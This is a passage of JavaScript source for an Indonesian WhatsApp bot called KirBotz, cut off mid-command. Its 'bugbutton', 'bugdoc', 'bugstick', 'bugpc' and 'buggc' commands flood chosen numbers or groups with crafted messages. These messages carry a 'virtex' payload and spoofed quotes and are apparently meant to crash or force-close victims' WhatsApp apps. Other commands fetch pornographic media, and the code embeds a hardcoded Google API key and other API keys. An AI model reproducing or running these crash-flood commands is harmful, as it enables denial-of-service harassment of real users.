replyNya(`Kirim/Reply Video/Audio/Image Yang Ingin Di Broadcast Dengan Caption ${prefix + command}`)
}
await fs.unlinkSync(media)
}
replyNya(`Sukses Mengirim Broadcast Ke ${anu.length} Chats`)
}
break
case 'bugbutton':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (args.length == 0) return replyNya(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let gejfjr = [
{
"title": `${buttonvirus}`,
 rows: [
{
"title": `${buttonvirus}`,
"rowId": `${buttonvirus}`
}
]
}]
kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Bug Button By KirBotz ", gejfjr, { quoted: lep })
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugdoc':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (args.length == 0) return replyNya(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku KirBotz`
for (let i = 0; i < jumlah; i++) {
kirbotz.sendMessage(from, { document: await reSize(ppnyauser, 200, 200),  fileName: `${buttonvirus}`,  mimetype: `application/zip`, jpegThumbnail: await reSize(ppnyauser, 200, 200), fileLength: "999999999", mentions:[sender] }, {quoted:lep})
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugstick':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (args.length == 0) return replyNya(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku KirBotz`
for (let i = 0; i < jumlah; i++) {
kirbotz.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": ppnyauser
}
}
}})
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugpc': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: kirbotz.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Tes Doank`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/62881036690566`
},
"businessOwnerJid": "62881036690566@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
kirbotz.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(toMs(waktu))
}
reply(`Sukses`)
}
break
case 'buggc2': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
kirbotz.sendMessage(num, { text: 'Oii kimoyasaaa' }, { quoted: lep})
await sleep(toMs(waktu))
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tekteka)
}
break
case 'buggc': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return replyNya(mess.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam\nExample : ${command} 62888@g.us|1\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: kirbotz.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Tes Doank`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/62881036690566`
},
"businessOwnerJid": "62881036690566@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
kirbotz.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
reply(tekteka)
}
break
case 'bcall': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (!isCreator) return replyNya(mess.owner)
                if (!text) return replyNya(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
                let anu = await store.chats.all().map(v => v.id)
                replyNya(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Group Bot',
                                    url: `${gckirbotz}`
                                }
                            }, {
                                callButton: {
                                    displayText: 'Nomor Owner',
                                    phoneNumber: '62881036690566'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      kirbotz.send5ButImg(yoi, txt, kirbotz.user.name, global.thumb, btn)
		}
		replyNya('Sukses Broadcast')
            }
            break
case 'asupan': case 'asupansantuy': case 'asupanbocil': case 'asupanukhty': case 'asupanghea': case 'asupanrikagusriani':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasiltod = await fetchJson(`https://api.dapuhy.xyz/api/asupan/${command}?apikey=${dapkey}`)
hasiltt = await getBuffer(hasiltod.result)
let btn = [{
                                urlButton: {
                                    displayText: 'Group Bot',
                                    url: `${gckirbotz}`
                                }
                            },
                            {
                                quickReplyButton: {
                                    displayText: 'Next',
                                    id: `${prefix+command}`
                                }  
                            }]
                      kirbotz.send5Vid(m.chat, `Nih Kak`, kirbotz.user.name, hasiltt, btn)
                      }
                      break
case 'chiisaihentai':
case 'trap':
case 'blowjob':
case 'yaoi':
case 'ecchi':
case 'ahegao':
case 'hololewd':
case 'sideoppai':
case 'animefeets':
case 'animebooty':
case 'animethighss':
case 'hentaiparadise':
case 'animearmpits':
case 'hentaifemdom':
case 'lewdanimegirls':
case 'biganimetiddies':
case 'animebellybutton':
case 'hentai4everyone':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasil = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`)
pll = `Nih Kak シ︎`
let message = await prepareWAMessageMedia({ image: hasil }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: pll,
hydratedFooterText: 'Created By BloodSword',
hydratedButtons: [{
urlButton: {
displayText: 'MyGithub',
url: 'https://github.com/kepoanjing'
}
},
{
urlButton: {
displayText: 'MyOwner',
url: 'https://wa.me/62881036690566'
}
},
{"quickReplyButton": {"displayText": "Next","id": `${prefix+command}`}}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'asupan2':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasiltod = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=${lolkey}`)
kirbotz.sendMessage(m.chat, { video: { url: hasiltod.result }, mimetype: 'video/mp4', fileName: `asupan.mp4`, caption: `Nih Asupan Nya` }, { quoted: fakekirbotz })
}
break
case 'ghea':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasilwjd = await fetchJson(`https://spybot-api.herokuapp.com/api/asupan/ghea?apikey=SpyBotApi`)
kirbotz.sendMessage(m.chat, { video: { url: hasilwjd.result.url }, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: fakekirbotz })
}
break
case 'ukhty':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasilwjd = await fetchJson(`https://spybot-api.herokuapp.com/api/asupan/ukty?apikey=SpyBotApi`)
kirbotz.sendMessage(m.chat, { video: { url: hasilwjd.result.url }, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: fakekirbotz })
}
break
case 'rikagusriani':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasifs = await fetchJson(`https://spybot-api.herokuapp.com/api/asupan/rikagusriani?apikey=SpyBotApi`)
kirbotz.sendMessage(m.chat, { video: { url: hasifs.result.url }, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: fakekirbotz })
}
break
case 'santuy':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasifs = await fetchJson(`https://raku-web.herokuapp.com/api/asupan/santuy?apikey=RakuKeyTod`)
kirbotz.sendMessage(m.chat, { video: { url: hasifs.result.url }, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: fakekirbotz })
}
break
case 'bocil':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasily = await fetchJson(`https://spybot-api.herokuapp.com/api/asupan/bocil?apikey=SpyBotApi`)
kirbotz.sendMessage(m.chat, { video: { url: hasily.result.url }, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: fakekirbotz })
}
break
case 'bokep':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
kirbotz.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: fakekirbotz })
}
break
case 'storyanime':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
sticWait(from)
hasiltod = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${lolkey}`)
kirbotz.sendMessage(m.chat, { video: { url: hasiltod.result }, mimetype: 'video/mp4', fileName: `storyanime.mp4`, caption: `Nih Story Animenya` }, { quoted: fakekirbotz })
}
break
case 'out':{
if (!isCreator) return replyNya(mess.owner)
kirbotz.groupLeave(from)
}
break
case 'public': {
if (!isCreator) return replyNya(mess.owner)
kirbotz.public = true
replyNya('Sukses Kak')
}
break
case 'self': {
if (!isCreator) return replyNya(mess.owner)
kirbotz.public = false
replyNya('Sukses Kak')
}
break
case 'toimg': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!quoted) return replyNya('Reply Image')
if (!/webp/.test(mime)) return replyNya(`balas stiker dengan caption *${prefix + command}*`)
sticWait(from)
let media = await kirbotz.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
kirbotz.sendMessage(m.chat, { image: buffer, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, { quoted: fakekirbotz })
fs.unlinkSync(ran)
})
}
break
case 'cry':
case 'kill':
case 'hug':
case 'pat':
case 'lick':
case 'kiss':
case 'bite':
case 'yeet':
case 'bully':
case 'bonk':
case 'wink':
case 'poke':
case 'nom':
case 'slap':
case 'smile':
case 'wave':
case 'awoo':
case 'blush':
case 'smug':
case 'glomp':
case 'happy':
case 'dance':
case 'cringe':
case 'cuddle':
case 'highfive':
case 'handhold':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
kirbotz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
break
case 'tourl':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isMedia) return reply(`Reply Media Dengan Perintah *${prefix+command}*`)
bucat = await (m.quoted ? m.quoted : m).download()
var { result } = await require('./Lib/upload')(bucat)
reply(`*SUCCESS*\n\nURL : \`\`\`${result.url}\`\`\``)
break
case 'attp':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} Hai`)
gehdhe = await getBuffer(`https://api.xteam.xyz/${command}?file&text=${encodeURI(q)}`)
kirbotz.sendMessage(m.chat, { sticker: gehdhe, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, { quoted: fakekirbotz })
break
case 'ttp':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} Hai`)
veireuue = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=${lolkey}&text=${encodeURI(q)}`)
kirbotz.sendMessage(m.chat, { sticker: veireuue, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, { quoted: fakekirbotz })
break
case 'tovideo': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (!quoted) throw 'Reply sticker'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                sticWait(from)
		        let { webp2mp4File } = require('./Lib/uploader')
                let media = await kirbotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await kirbotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'tovn':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            sticWait(from)
            let media = await quoted.download()
            let audio = await toPTT(media, 'mp4')
            kirbotz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
case 'tomp3': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            sticWait(from)
            let media = await quoted.download()
            let audio = await toAudio(media, 'mp4')
            kirbotz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${kirbotz.user.name}.mp3`}, { quoted : m })
            }
            break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!quoted) replyNya(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kirbotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyNya('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kirbotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replyNya (`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
case 'emojimix': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!text) return replyNya(`Example : ${prefix + command} 😅+🤔`)
let [emoji1, emoji2] = text.split`+`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await kirbotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'emoji':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Contoh: ${prefix + command} 🗿`)
titor = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${encodeURI(q)}?apikey=${lolkey}`)
let encmedia = await kirbotz.sendImageAsSticker(m.chat, titor, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
break
case 'dadu':
case 'patrick':
case 'amongus':
case 'gawrgura':
case 'anjing':
case 'bucinstick':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let buffer = await getBuffer(`https://api.lolhuman.xyz/api/sticker/${command}?apikey=${lolkey}`)
kirbotz.sendMessage(m.chat, { sticker: buffer, contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, { quoted: fakekirbotz })
break
case 'faktaunik': 
case 'katabijak': 
case 'pantun': 
case 'bucin': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
kohg = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: kohg.result,
footerText: 'Pencet Button Untuk Next',
buttons: buttons,
headerType: 2
}
kirbotz.sendMessage(m.chat, buttonMessage, { quoted: fakekirbotz })
}
break
case 'quotes':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
var res = await Quotes()
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: teks,
footerText: 'Pencet Button Untuk Next',
buttons: buttons,
headerType: 2
}
kirbotz.sendMessage(m.chat, buttonMessage, { quoted: fakekirbotz })
}
break
case 'tafsirsurah': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!args[0]) return replyNya(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
if (!args[1]) return replyNya(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah* 」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
replyNya(txt)
}
break
case 'cerpen-anak':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`anak`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`bahasa daerah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasainggris':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`bahasa Inggris`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasajawa':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`bahasa jawa`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasasunda':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`bahasa sunda`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-budaya':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`budaya`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cinta':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`cinta`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaislami':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`cinta islami`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintapertama':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`cinta pertama`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaromantis':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`cinta romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasedih':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`cinta sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`Cinta segitiga`)
